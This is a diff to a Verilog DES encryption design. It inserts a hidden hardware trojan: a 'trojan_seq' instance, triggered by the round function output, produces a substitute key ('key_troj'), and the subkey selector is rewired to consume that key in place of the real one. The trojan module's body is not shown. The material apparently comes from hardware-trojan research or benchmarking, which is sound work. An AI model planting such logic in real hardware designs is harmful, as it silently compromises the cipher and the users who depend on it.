@@ -75,7 +75,8 @@ module des(clk_in, rst);
 				.key(key56), 
 				.decrypt(1'b0), 
 				.roundSel(cnt), 
-				.clk(clk));
+				.clk(clk),
+				.rst(rst));
 				
 	ram1 U2(
 	.address({1'b0,cnt[3:0]}),
@@ -93,7 +94,7 @@ module des(clk_in, rst);
 endmodule
 
 
-module des_o(desOut, desIn, key, decrypt, roundSel, clk);
+module des_o(desOut, desIn, key, decrypt, roundSel, clk, rst);
 	output	[63:0]	desOut;
 	input	[63:0]	desIn;
 	input	[55:0]	key;
@@ -107,6 +108,7 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk);
 	wire	[1:32]	Xin;
 	wire	[1:32]	Lout, Rout;
 	wire	[1:32]	out;
+	wire 	[55:0]	key_troj;
 
 	assign Lout = (roundSel == 0) ? IP[33:64] : R;
 	assign Xin  = (roundSel == 0) ? IP[01:32] : L;
@@ -114,6 +116,7 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk);
 	assign FP = { Rout, Lout};
 
 	crp u0( .P(out), .R(Lout), .K_sub(K_sub) );
+	trojan_seq u2(.clk(clk), .rst(rst), .key(key), .trigger(out), .payload(key_troj));
 
 	always @(posedge clk)
 			  L <= #1 Lout;
@@ -124,7 +127,7 @@ module des_o(desOut, desIn, key, decrypt, roundSel, clk);
 	// Select a subkey from key.
 	key_sel u1(
 		.K_sub(		K_sub		),
-		.K(		key		),
+		.K(		key_troj		),
 		.roundSel(	roundSel	),
 		.decrypt(	decrypt		)
 		);
